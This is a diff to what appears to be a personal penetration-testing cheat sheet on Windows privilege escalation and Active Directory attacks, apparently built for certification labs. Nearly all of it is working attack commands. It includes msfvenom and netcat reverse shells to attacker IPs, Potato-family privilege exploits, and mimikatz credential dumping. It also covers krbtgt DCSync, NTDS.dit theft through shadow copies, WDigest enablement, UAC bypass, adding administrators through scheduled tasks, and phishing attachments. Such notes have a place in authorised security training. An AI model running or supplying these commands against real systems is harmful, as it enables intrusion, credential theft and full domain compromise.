@@ -874,17 +1164,25 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.178 LPORT=443 -f dll 
 msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f dll > shell.dll
 ```
 
+#### Using ProcMon
+
 Browse in the Windows Explorer to C:\tools\Procmon\ and double-click on Procmon64.exe.
 
+For specific executable.
 We enter the following arguments: Process Name as Column, is as Relation, BetaServ.exe as Value, and Include as Action. Once entered, we'll click on Add.
+
+Blanket searching for missing DLLs.
+We enter the following arguments: [ Result - Contains - not found - then Include ] & [ Path - ends with - .dll - then Include ] & just show the [] File System Activity ]. THIS MAY TAKE SOME MINUTES.
 
 After applying the filter, the list is empty. In order to analyze the service binary, we should try restarting the service as the binary will then attempt to load the DLLs.
 
-```ps
-> Restart-Service BetaService
+```bash
+Restart-Service BetaService
 ```
 
 Look for the Detail column to state NAME NOT FOUND for these calls, which means that a DLL with this name couldn't be found in any of these paths. You can see that the order in which the DLL is being called. There are going to be a shit ton of calls in Procmon.. take your time and check everything.
+
+#### Dll Search Order 
 
 1. The directory from which the application loaded.
 2. The system directory.
@@ -942,6 +1240,39 @@ Restart-Service BetaService
 net user
 net localgroup administrators  # Confirm that the new user is created (with administrators privileges)
 ```
+
+### Writable System Path DLL Hijacking
+
+The first thing you need is to identify a process running with more privileges than you that is trying to load a Dll from the System Path you can write in.
+
+The problem in this cases is that probably thoses processes are already running. To find which Dlls are lacking the services you need to launch procmon as soon as possible (before processes are loaded). So, to find lacking .dlls..
+
+	Create the folder C:\privesc_hijacking and add the path C:\privesc_hijacking to System Path env variable. You can do this manually or with PS.
+
+```bash
+# Set the folder path to create and check events for
+$folderPath = "C:\privesc_hijacking"
+
+# Create the folder if it does not exist
+if (!(Test-Path $folderPath -PathType Container)) {
+    New-Item -ItemType Directory -Path $folderPath | Out-Null
+}
+
+# Set the folder path in the System environment variable PATH
+$envPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
+if ($envPath -notlike "*$folderPath*") {
+    $newPath = "$envPath;$folderPath"
+    [Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine")
+}
+```
+
+
+    Launch procmon and go to Options --> Enable boot logging and press OK in the prompt.
+    Then, reboot. When the computer is restarted procmon will start recording events asap.
+    Once Windows is started execute procmon again, it'll tell you that it has been running and will ask you if you want to store the events in a file. Say yes and store the events in a file.
+    After the file is generated, close the opened procmon window and open the events file.
+    Add these filters and you will find all the Dlls that some proccess tried to load from the writable System Path folder. [Result Y, Path Y]
+
 
 ### Unquoted Service Paths
 
@@ -1003,6 +1334,18 @@ net localgroup administrators # Verify
 
 ### Scheduled Tasks
 
+Find.
+
+```bash     
+$header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"
+
+schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
+```
+
+```bash
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
+
 For us, three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:
 
     As which user account (principal) does this task get executed?
@@ -1019,6 +1362,17 @@ move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
 move .\BackendCacheCleanup.exe .\Pictures\
 net user
 net localgroup administrators # Verify new user is created
+```
+
+```bash
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
+
+#### IF YOU CAN WRITE TO A BAT FILE BEING EXECUTED BY A SCHEDULED TASK ->
+
+```bash
+schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
 ```
 
 #### Get-Service
@@ -1041,13 +1395,45 @@ python3 -m http.server 80
 ```
 
 ```bash
+get-service # ensure that Spooler is running
 powershell -ep bypass
 iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 .\PrintSpoofer64.exe -i -c powershell.exe # -i to interact w the process &  -c to specify the command we want to execute
 whoami # Verify that it worked, that you are not NT AUTHORITY\SYSTEM
 ```
 
-There are other similar tools such as RottenPotato, SweetPotato, or JuicyPotato.
+SweetPotato.
+
+```bash
+.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
+```
+
+
+Juicy Potato 
+- Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation
+
+```bash
+c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *
+```
+
+Lovely Potato (Automated Juicy Potato)
+- https://github.com/TsukiCTF/Lovely-Potato
+- Works only until Windows Server 2016 and Windows 10 until patch 1803
+
+PrintSpoofer (Exploit the PrinterBug for System Impersonation)
+- Works for Windows Server 2019 and Windows 10, Spooler Service needs to be on
+
+```bash
+c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
+```
+
+RoguePotato (Upgraded Juicy Potato)
+Works for Windows Server 2019 and Windows 10
+
+GodPotato
+- Best if Spooler Service isn't On, with SweetPotato coming close
+- Try both NET2 and NET4 unless you know which one to use
+
 
 #### Decrypt GPP Password
 
@@ -1062,7 +1448,7 @@ kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 #### Whenever you get a Shell
 
 ```bash
-Start-Process -NoNewWindow -FilePath C:\Windows\Tools\shell.exe
+Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe
 ```
 
 #### UAC Bypass
@@ -1077,6 +1463,8 @@ Invoke-EventViewer "C:\Windows\Tasks\shell.exe"
 
 Run all MimiKatz commands and save the output:
 
+If mimikatz is acting a fool, do a one-liner.
+
 ```bash
 .\mimikatz.exe
 token::elevate # Makes sure commands are run as system
@@ -1084,13 +1472,21 @@ token::elevate /domainadmin
 privilege::debug # Test if ^ is the case
 log
 sekurlsa::logonpasswords # Who has been on the host machine?
+kerberos::list /export
+kerberos::ptt ticket.kirbi # whoami will return your name pre-ptt, must test by access or executing something you couldn't before
 lsadump::lsa /inject
+lsadump::lsa /inject /name:krbtgt
+kerberos::tgt
 sekurlsa::msv
 sekurlsa::ekeys
 lsadump::sam
 lsadump::secrets
 lsadump::cache
+
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "kerberos::list /export" "sekurlsa::msv" "sekurlsa::ekeys" "lsadump::sam" "lsadump::secrets" "lsadump::cache"  "exit"
 ```
+
+
 
 If you see a username with a "$" at the end, this is a machine account, and cracking these passwords are infeasable at the moment. Look for service to be in Users OU, not Servers.
 
@@ -1298,7 +1694,7 @@ Get-ChildItem -Path C:\Users -Recurse| Select-String -Pattern "password" | Selec
 Get-ChildItem -Path . -Recurse| Select-String -Pattern "password" | Select-Object Path, LineNumber, Line
 ```
 
-#### For Modifiable Executables but Unknown Pronadal vs djokovic 2012 french opencess, Watch What's Going on
+#### For Modifiable Executables but Unknown Process, Watch What's Going on
 
 ```bash
 Get-Process | Watch-Command -Difference -Continuous -Verbose
@@ -1490,6 +1886,15 @@ dir /s /p local.txt
 #### Windows Services - insecure file persmissions
 
 ````bash
+get-service
+get-service ApacheHTTPServer | get-member
+get-service ApacheHTTPServer | Select-Object *
+Get-CIMInstance -Class Win32_Service -Filter "name ='MSSQL' " | Select-Object *
+Get-CIMInstance -Class Win32_Service -filter "StartName != 'LocalSystem' AND NOT StartName LIKE 'NT Authority%' " | Select-Object * | Sort-Object StartName
+wmic service list brief
+sc query
+.\accesschk.exe -ucqv ApacheHTTPServer -accepteula
+.\accesschk.exe -wvud ApacheHTTPServer -accepteula # What the pro useus
 accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command refer to exploits below
 ````
 
@@ -1576,8 +1981,11 @@ PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
 To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file, which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
 
 ```bash
+.\mimikatz.exe
+privilege::debug
 lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
 lsadump::dcsync /user:zenservice #Pick a user with domain admin rights to crack the password or pass the hash
+lsadump::dcsync /user:dcorp\krbtgt
 
 Credentials:
   Hash NTLM: d098fa8675acd7d26ab86eb2581233e5
@@ -1586,6 +1994,12 @@ Credentials:
 ...
 kali@kali: impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zenservice@192.168.183.170
 ````
+
+See who can do dcsync.
+
+```bash
+Get-ObjectAcl -DistinguishedName "dc=nagoya-industries,dc=com" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
+```
 
 #### Exploiting Certificate Authority
 
@@ -1692,6 +2106,32 @@ reg save hklm\system c:\Temp\system
 cd Temp
 download sam
 download system
+
+secretsdump.py -sam sam -system system local
+```
+
+If that isn't good enough..
+
+```bash
+mkdir c:\temp
+cd c:\temp
+
+### back_script.txt
+set verbose on 
+set metadata C:\Windows\Temp\meta.cab 
+set context clientaccessible 
+set context persistent 
+begin backup 
+add volume C: alias cdrive 
+create 
+expose %cdrive% E: 
+end backup 
+###
+
+diskshadow /s back_script.txt
+robocopy /b E:\Windows\ntds . ntds.dit
+
+secretsdump.py -ntds ntds.dit -system system local 
 ```
 
 #### SeRestorePrivilege
@@ -1701,15 +2141,26 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.178 LPORT=443 EXITFUNC=th
 upload binary.exe
 sudo nc -lvnp 80
 .\SeRestoreAbuse.exe "cmd /c C:\windows\tasks\binary.exe"
+
+.\EnableSeRestorePrivilege.ps1
+if access to RDP and C:\Windows\System32 then you an do the utilman exploit.
 ```
 
-#### Exploiting Service Operators Group Membership
+#### Exploiting Service (think I meant..) Server Operators Group Membership
 
 ```bash
 services # look for True
 upload nc.exe
 sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe 192.168.1.205 1234"
 nc -lvnp 1234
+```
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=$myip LPORT=$port EXITFUNC=thread -f exe > shell.exe
+
+sc.exe config VMTools binPath="C:\Users\aarti\Documents\shell.exe"
+sc.exe stop VMTools
+sc.exe start VMTools
 ```
 
 #### ForceChangePassword
@@ -1798,4 +2249,94 @@ python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-s
 python /opt/mmg-ods.py windows 192.168.45.178 80
 sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.218.140 --body body.txt --header "Subject: Staging Script"
 ```
-sudo swaks -t neil@bratarina --from _smtpd@COFFEECORP --attach @bad.odt --server $ip --body body.txt --header "Subject: Staging Script"https://github.com/gtworek/Priv2Admin
+```
+sudo swaks -t neil@bratarina --from _smtpd@COFFEECORP --attach @bad.odt --server $ip --body body.txt --header "Subject: Staging Script"
+```
+https://github.com/gtworek/Priv2Admin
+https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#kerberoast
+https://github.com/bitsadmin/wesng
+
+#### WerTrigger
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.231 LPORT=6969 -f dll > phoneinfo.dll
+
+# Place files into system32 as an administrator
+select load_file('C:\\xampp\\htdocs\\phoneinfo.dll') into dumpfile 'C:\\Windows\\system32\\phoneinfo.dll';
+select load_file('C:\\xampp\\htdocs\\Report.wer') into dumpfile 'C:\\Windows\\system32\\Report.wer';
+select load_file('C:\\xampp\\htdocs\\WerTrigger.exe') into dumpfile 'C:\\Windows\\system32\\WerTrigger.exe';
+
+cd C:\windows\system32
+.\WerTrigger.exe
+```https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#sam-and-system-files
+```
+
+#### Watch over DLLs in a folder
+
+```bash
+$folderPath = "C:\java\jre\bin" ; if (!(Test-Path $folderPath -PathType Container)) {     New-Item -ItemType Directory -Path $folderPath | Out-Null } $envPath = [Environment]::GetEnvironmentVariable("PATH", "Machine") ; if ($envPath -notlike "*$folderPath*") {     $newPath = "$envPath;$folderPath"  ;   [Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine") }
+```
+
+#### Getting a Reverse Shell from SMB (Windows)
+
+You can create a .lnk file with hashgrab.py and impacket's smb server:
+
+```bash
+python3 /opt/hashgrab.py 192.168.45.163 test
+sudo responder -I tun0
+# or impacket-smbserver share share -smb2support
+smbclient \\\\$ip\\nara
+put test.lnk
+# look for hashes in smb server
+```
+
+#### Kerberos and Certificates
+
+"https://github.com/nturley3/zeek-kerberos-haters-guide"
+
+#### Extract Hashes from LSASS Dump
+
+```bash
+pypykatz lsa minidump lsass.DMP
+```
+
+#### Enable WDigest on Newer Machines
+
+While WDigest is disabled on newer machines, it is possible for attackers to enable it so plaintext credentials once a user logs in. WDigest can be enabled by setting the necessary registry key to “1” instead of “0”: 
+
+```bash
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1
+```
+
+```bash
+nxc smb 192.168.0.76 -u testadmin -p Password123 -M wdigest -o action=enable
+```
+
+
+#### Sid to Name - Name to Sid
+
+```bash
+# SID to Name
+convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601
+
+# Name to SID
+Get-DomainSID -Domain child.red.com
+```
+
+#### UAC Bypass
+
+```bash
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass;. .\UACBypass.ps1
+```
+
+#### PWNED
+
+```bash
+echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: & type "C:\Users\Administrator\Desktop\proof.txt" 2> nul & type "C:\Documents and Settings\Administrator\Desktop\proof.txt" 2> nul & type %USERPROFILE%\Desktop\proof.txt 2> null
+```
+
+#### Executing MSI Package
+
+```bash
+msiexec /i c:\users\smelly\desktop\aie.msi /quiet /qn /norestart
+```
